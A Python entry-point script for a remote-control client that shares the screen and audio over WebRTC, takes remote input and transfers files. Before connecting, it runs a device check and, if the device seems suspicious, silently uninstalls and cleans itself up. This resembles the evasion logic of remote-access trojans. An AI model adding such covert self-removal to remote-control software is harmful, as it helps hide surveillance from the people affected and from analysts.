"""Entry point for the remote client."""
from __future__ import annotations

import asyncio
import os

from remote_client.control.handlers import ControlHandler
from remote_client.control.input_controller import InputController
from remote_client.files.file_service import FileService
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.security.anti_fraud import analyze_device, silent_uninstall_and_cleanup
from remote_client.webrtc.client import WebRTCClient
from remote_client.webrtc.signaling import create_signaling


def build_client() -> WebRTCClient:
    signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
    signaling_port = int(os.getenv("RC_SIGNALING_PORT", "9999"))
    signaling_session = os.getenv("RC_SIGNALING_SESSION", "default-session")

    signaling = create_signaling(signaling_host, signaling_port, signaling_session)
    control_handler = ControlHandler(InputController())
    file_service = FileService()
    media_tracks = [ScreenTrack(), AudioTrack()]

    return WebRTCClient(
        signaling=signaling,
        control_handler=control_handler,
        file_service=file_service,
        media_tracks=media_tracks,
    )


def main() -> None:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    anti_fraud = analyze_device()
    if anti_fraud.is_suspicious:
        silent_uninstall_and_cleanup(base_dir)
        return

    client = build_client()
    asyncio.run(client.run_forever())


if __name__ == "__main__":
    main()
